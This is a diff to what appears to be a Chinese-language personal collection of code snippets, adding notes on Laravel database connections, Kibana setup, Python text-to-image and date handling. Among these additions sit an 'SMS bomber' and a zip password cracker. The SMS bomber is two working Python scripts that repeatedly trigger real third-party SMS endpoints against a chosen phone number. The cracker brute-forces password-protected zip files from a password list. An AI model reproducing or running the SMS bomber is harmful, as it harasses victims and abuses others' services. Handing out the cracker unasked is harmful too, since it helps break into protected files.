@@ -488,9 +488,9 @@ function contains_html($str)
     {
         return $str != strip_tags($str);
     }
-    ```
-    ###主库查询
-    ```js
+```
+###主库查询
+```js
     
     $this->setConnection('webinar');链接指定数据库// 强制走主库
 					$webinarDailyObj = new WebinarDailyFlow();
@@ -499,7 +499,7 @@ $model = new self();
         $count = $model->setConnection('master_write')->where('webinar_id', $webinarId)->count();
 $count=\DB::connection('master_write')->table('users')->find(20);
 
-    ```
+```
 ###sql拼接
 ```js
 foreach( $multipleData as $data ) {
@@ -508,7 +508,7 @@ foreach( $multipleData as $data ) {
             $q = rtrim($q, ", ")." WHERE ".$referenceColumn." IN (".  rtrim($whereIn, ', ').")";
  
             return DB::update(DB::raw($q));
-            ```
+```
 ###[php识别二维码](http://git.oschina.net/capitalist/php-qr-decoder)
 ```js
 include_once('./lib/QrReader.php');
@@ -656,4 +656,123 @@ sudo ./bin/plugin install marvel-agent
 cd kibana-4.5.3
 sudo ./bin/kibana plugin --install elasticsearch/marvel/latest
 ./bin/kibana
+```
+###[python将文字转换成图片 ](http://blog.csdn.net/iloster/article/details/25431007)
+```js
+    import os  
+    import pygame  
+    from pygame.locals import *  
+      
+    pygame.init()  
+       
+    text = u"这是一段测试文本，test 123。"  
+    font = pygame.font.SysFont('SimHei', 14)  
+    ftext = font.render(text, True, (0, 0, 0), (255, 255, 255))  
+       
+    pygame.image.save(ftext, "t.jpg")  
+```
+###第三周的第四天
+```js
+$date = new DateTime();
+//传入2017，3，4表示2017年第三周第4天得到2017-1-19的时间对象
+$date->setISODate(2017, 3, 4);// 第三周的第四天
+echo $date->format('Y-m-d') 
+```
+###[python版的短信轰炸机](http://blog.csdn.net/iloster/article/details/27795017)
+```js
+    import httplib,urllib,sys,os,re,urllib2  
+    import string  
+        #https://github.com/iloster/PythonScripts/blob/master/opera.py
+    def attack(phone):  
+        datas=""   
+        url='http://www.oupeng.com/sms/sendsms.php?os=s60&mobile=%s' % phone  
+        i_headers = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1) Gecko/20090624 Firefox/3.5",    
+                      "Accept": "text/plain",'Referer':'http://www.oupeng.com/download'}   
+        #payload=urllib.urlencode(payload)  
+         
+        try:  
+            request=urllib2.Request(url=url,headers=i_headers)  
+            response=urllib2.urlopen(request)  
+            datas=response.read()  
+            print datas  
+            print 'attack success!!!'  
+        except Exception, e:  
+            print e  
+            print "attack failed!!!"   
+       
+    if __name__=="__main__":  
+        phone=raw_input('input the phone:')  
+        attack(phone) 
+import httplib,urllib,sys,os,re,urllib2  
+import string  
+  
+def attack(phone):  
+    datas=""  
+      
+    url='http://topic.hongxiu.com/wap/action.aspx'  
+    #请求的数据  
+    payload={'hidtpye':'1',  
+        'txtMobile':phone}  
+    #注意Referer不能为空  
+    i_headers = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1) Gecko/20090624 Firefox/3.5",    
+                  "Accept": "text/plain",'Referer':'http://topic.hongxiu.com/wap/'}   
+    payload=urllib.urlencode(payload)  
+     
+    try:  
+        request=urllib2.Request(url,payload,i_headers)  
+        response=urllib2.urlopen(request)  
+        datas=response.read()  
+        print datas  
+        print 'attack success!!!'  
+    except Exception, e:  
+        print e  
+        print "attack failed!!!"   
+   
+if __name__=="__main__":  
+    phone=raw_input('input the phone:')  
+    attack(phone)  	
+	
+	
+```
+###[暴力破解含密码的zip压缩文件 ](http://blog.csdn.net/iloster/article/details/23523807)
+```js
+    import zipfile  
+    import os  
+    from threading import Thread  
+    import time  
+    #压缩文件的路径 https://github.com/iloster/PythonScripts 
+    path = r'C:\Users\Administrator\Desktop\moeMaid-master.zip'  
+    #password='1234'  
+      
+    def pojie_zip(path,password):  
+        if path[-4:]=='.zip':  
+            #path = dir+ '\\' +file  
+            #print path  
+            zip = zipfile.ZipFile(path, "r",zipfile.zlib.DEFLATED)  
+            #print zip.namelist()  
+            try:  
+                #若解压成功，则返回True,和密码  
+                zip.extractall(path='C:\\Users\\Administrator\\Desktop\\',members=zip.namelist() , pwd=password)  
+                print ' ----success!,The password is %s' % password  
+                zip.close()  
+                return True  
+            except:  
+                pass  #如果发生异常，不报错  
+            print 'error'  
+              
+              
+    def get_pass():  
+        #密码字典的路径  
+        passPath='C:\\Users\\Administrator\\Desktop\\zip.txt'  
+        passFile=open(passPath,'r')  
+        for line in passFile.readlines():  
+            password=line.strip('\n')  
+            print 'Try the password %s' % password  
+            if pojie_zip(path,password):  
+                break  
+        passFile.close()  
+    if __name__=='__main__':  
+        start=time.clock()  
+        get_pass()  
+        print "done (%.2f seconds)" % (time.clock() - start)  
 ```
